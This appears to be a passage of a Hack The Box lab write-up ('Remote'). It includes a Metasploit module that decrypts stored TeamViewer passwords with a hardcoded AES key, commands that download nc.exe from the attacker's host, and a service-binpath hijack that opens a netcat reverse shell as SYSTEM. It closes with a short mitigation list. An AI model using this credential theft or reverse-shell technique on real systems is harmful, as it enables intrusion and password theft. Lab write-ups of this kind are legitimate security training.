  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather TeamViewer Passwords',
        'Description' => %q{ This module will find and decrypt stored TeamViewer passwords },
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'],
          [ 'URL', 'https://www.cnblogs.com/Kali-Team/p/12468066.html' ]
        ],
        'Author' => [ 'Nic Losby <blurbdust[at]gmail.com>', 'Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('WINDOW_TITLE', [ false, 'Specify a title for getting the window handle, e.g. TeamViewer', 'TeamViewer']),
      ]
    )
  end

  def app_list
    results = ''
    keys = [
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer', 'Version' ],
      [ 'HKLM\\SOFTWARE\\TeamViewer\\Temp', 'SecurityPasswordExported' ],
      [ 'HKLM\\SOFTWARE\\TeamViewer', 'Version' ],
    ]

    locations = [
      { value: 'OptionsPasswordAES', description: 'Options Password' },
      { value: 'SecurityPasswordAES', description: 'Unattended Password' }, # for < v9.x
      { value: 'SecurityPasswordExported', description: 'Exported Unattended Password' },
      { value: 'ServerPasswordAES', description: 'Backend Server Password' }, # unused according to TeamViewer
      { value: 'ProxyPasswordAES', description: 'Proxy Password' },
      { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14
    ]

    keys.each do |parent_key, _child_key|
      locations.each do |location|
        secret = registry_getvaldata(parent_key, location[:value])
        next if secret.nil?

        plaintext = decrypt(secret)
        next if plaintext.nil?

        print_good("Found #{location[:description]}: #{plaintext}")
        results << "#{location[:description]}: #{plaintext}\n"
        store_valid_credential(
          user: nil,
          private: plaintext,
          private_type: :password,
          service_data: {
            address: session.session_host,
            last_attempted_at: nil,
            origin_type: :session,
            port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139
            post_reference_name: refname,
            protocol: 'tcp',
            service_name: 'teamviewer',
            session_id: session_db_id,
            status: Metasploit::Model::Login::Status::UNTRIED
          }
        )
      end
    end

    # Only save data to disk when there's something in the table
    unless results.empty?
      path = store_loot('host.teamviewer_passwords', 'text/plain', session, results, 'teamviewer_passwords.txt', 'TeamViewer Passwords')
      print_good("Passwords stored in: #{path}")
    end
  end

  def decrypt(encrypted_data)
    password = ''
    return password unless encrypted_data

    password = ''

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new('AES-128-CBC')
    begin
      aes.decrypt
      aes.key = key
      aes.iv = iv
      plaintext = aes.update(encrypted_data)
      password = Rex::Text.to_ascii(plaintext, 'utf-16le')
      if plaintext.empty?
        return nil
      end
    rescue OpenSSL::Cipher::CipherError => e
      print_error("Unable to decrypt the data. Exception: #{e}")
    end

    password
  end

  def get_window_text(window_hwnd)
    if window_hwnd
      addr = session.railgun.util.alloc_and_write_wstring('Kali-Team')
      client.railgun.user32.SendMessageW(window_hwnd, 'WM_GETTEXT', 1024, addr)
      text = session.railgun.util.read_wstring(addr)
      client.railgun.multi([
        ['kernel32', 'VirtualFree', [addr, 0, MEM_RELEASE]],
      ])
      if text.strip == ''
        return nil
      else
        return text
      end
    else
      return nil
    end
  end

  # EnumWindows Function not work in RailGun, I don't know how to define the lpEnumFunc parameter
  def enum_id_and_password(hwnd_main)
    hwnd_mwrcp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'MainWindowRemoteControlPage', nil)
    hwnd_irccv = client.railgun.user32.FindWindowExW(hwnd_mwrcp['return'], nil, 'IncomingRemoteControlComponentView', nil)
    hwnd_custom_runner_id = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], nil, 'CustomRunner', nil)
    hwnd_custom_runner_pass = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], hwnd_custom_runner_id['return'], 'CustomRunner', nil)
    #  find edit box handle
    hwnd_id_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_id['return'], nil, 'Edit', nil)
    print_status("Found handle to ID edit box 0x#{hwnd_id_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_pass['return'], nil, 'Edit', nil)
    print_status("Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  get window text
    if hwnd_id_edit_box['return'] && hwnd_pass_edit_box['return']
      print_good("ID: #{get_window_text(hwnd_id_edit_box['return'])}")
      print_good("PASSWORD: #{get_window_text(hwnd_pass_edit_box['return'])}")
    else
      print_error('Handle for TeamViewer ID or password edit box not found')
    end
  end

  def enum_email_and_password(hwnd_main)
    hwnd_lp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'LoginPage', nil)
    hwnd_lfv = client.railgun.user32.FindWindowExW(hwnd_lp['return'], nil, 'LoginFormView', nil)
    #  find edit box handle
    hwnd_email_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], nil, 'Edit', nil)
    print_status("Found handle to Email edit box 0x#{hwnd_email_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], hwnd_email_edit_box['return'], 'Edit', nil)
    print_status("Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  Remove ES_PASSWORD style
    #  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongw
    #  https://docs.microsoft.com/en-us/windows/win32/controls/edit-control-styles
    #  GWL_STYLE  -16
    client.railgun.user32.SetWindowWord(hwnd_pass_edit_box['return'], -16, 0)
    #  get window text
    email_text = get_window_text(hwnd_email_edit_box['return'])
    pass_text = get_window_text(hwnd_pass_edit_box['return'])
    if email_text
      print_good("EMAIL: #{email_text}")
    else
      print_error('Handle for TeamViewer ID or Password edit box not found')
    end
    if pass_text
      print_good("PASSWORD: #{pass_text}")
    else
      print_error('No password in Password edit box')
    end
  end

  def run
    print_status("Finding TeamViewer Passwords on #{sysinfo['Computer']}")
    app_list

    print_status('<---------------- | Using Window Technique | ---------------->')
    parent_key = 'HKEY_CURRENT_USER\\Software\\TeamViewer'
    language = registry_getvaldata(parent_key, 'SelectedLanguage')
    version = registry_getvaldata(parent_key, 'IntroscreenShownVersion')
    print_status("TeamViewer's language setting options are '#{language}'")
    print_status("TeamViewer's version is '#{version}'")
    hwnd = client.railgun.user32.FindWindowW('#32770', datastore['WINDOW_TITLE'])['return']

    #  Try to get window handle through registry
    if !hwnd
      hwnd = registry_getvaldata(parent_key, 'MainWindowHandle')
    end
    if hwnd != 0
      print_good("TeamViewer's  title is '#{get_window_text(hwnd)}'")
      enum_id_and_password(hwnd)
      enum_email_and_password(hwnd)
    else
      if !session.sys.process.each_process.find { |i| i['name'].downcase == 'TeamViewer.exe'.downcase }
        print_error('Unable to find TeamViewer\'s process')
        return false
      end
      print_error('Unable to find TeamViewer\'s window. Try to set window title')
      return false
    end
  end
end
```



So we got a couple of options. I can see from the metasploit script that the teamviewer creds are stored in the registry.


I know we are running version 7:

```
pwd

Path                                      
----                                      
C:\Program Files (x86)\TeamViewer\Version7


PS C:\Program Files (x86)\TeamViewer\Version7> 

```


I google and find this: https://github.com/V1V1/DecryptTeamViewer

I compile it on my windows machine and transfer it:

```
Invoke-WebRequest -Uri http://10.10.14.51:8000/DecryptTeamViewer.exe -OutFile DecryptTeamViewer.exe
./DecryptTeamViewer.exe


=== DecryptTeamViewer: Pillaging registry for TeamViewer information ===


=== TeamViewer version ===



=== User Information ===

Account name: 
User email: System.Object

=== Proxy Information ===

Proxy IP: 
Proxy username: 
Proxy password: 

=== Decrypted Credentials ===

TeamViewer options password: 
TeamViewer server password: 
TeamViewer security password: 
TeamViewer exported security password: 
TeamViewer license key: 

PS C:\Windows\Temp> 

```

Didn't work. I give up on TeamViewer for now.

I uploaded winPEAS.exe to the machine to see what I could find.

```
  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 17763
       [!] CVE-2019-0836 : VULNERABLE
        [>] https://exploit-db.com/exploits/46718
        [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/                                                         

       [!] CVE-2019-0841 : VULNERABLE
        [>] https://github.com/rogue-kdc/CVE-2019-0841
        [>] https://rastamouse.me/tags/cve-2019-0841/

       [!] CVE-2019-1064 : VULNERABLE
        [>] https://www.rythmstick.net/posts/cve-2019-1064/

       [!] CVE-2019-1130 : VULNERABLE
        [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

       [!] CVE-2019-1253 : VULNERABLE
        [>] https://github.com/padovah4ck/CVE-2019-1253

       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/      

```
And also a modifiable service:


```

  [+] Modifiable Services
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start

```
So we can modify the service binary_path_name to run whatever we want.

I download nc.exe with invoke-webrequest as I did earlier, and go on to modify the service:

```
Invoke-WebRequest -Uri http://10.10.14.51:8000/nc.exe -OutFile nc.exe
sc.exe config UsoSvc binpath= "C:\Windows\Temp\nc.exe -nv 10.10.14.51 1338 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
wmic service UsoSvc call startservice
```

And on the listener:

```
root@kali:/home/kali/htb/Remote# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.1.153 49755
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## Comparing myself to the official writeup:

they check out ftp and find nothing.

They find umbraco on the web server.

they discover the mount and figure out that umbraco stores credentials in umbraco.sdf. They find the hash there.

they find the exploit and use metasploit to create a payload.

They find teamviewer and use a metasploit module to get the teamviewer creds.

An alternative method is to use the PrintSpoofer exploit, which uses an impersonation privlige to get system access.



## How to stop this exploit:

Remove the public access to the backup, update umbraco. And then there is fixing the system.

update to the latest teamviewer. Remove access for the web account to the services. And update Windows.